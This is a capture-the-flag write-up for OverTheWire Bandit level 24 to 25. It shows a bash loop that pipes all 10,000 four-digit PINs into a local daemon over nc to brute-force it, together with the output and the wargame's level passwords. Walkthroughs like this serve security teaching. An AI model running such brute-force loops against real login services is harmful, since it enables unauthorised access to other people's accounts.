# CTF Write-Up: [Level 24 → 25](https://overthewire.org/wargames/bandit/bandit25.html)

> **Platform:** OverTheWire | **Type:** Bandit

---

## 🚩 Password for Next Level

<details>
<summary>bandit25</summary>

`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

</details>

---

## Challenge

A daemon on port `30002` requires the Level 24 password and a secret 4-digit PIN. The only way to find the PIN is brute force, but the daemon accepts multiple attempts over a single connection, so all 10,000 combinations can be piped in at once.

---

## Solution

Test the service to confirm the expected format:

```bash
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1111" | nc localhost 30002
```

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```

Generate all PINs `0000`–`9999`, pipe them through one connection, and filter out the failures:

```bash
for pin in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc localhost 30002 | grep -v "Wrong!"
```

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

Log into the next level:

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

---

*Bandit Level 24 → 25 — OverTheWire | Completed ✅*
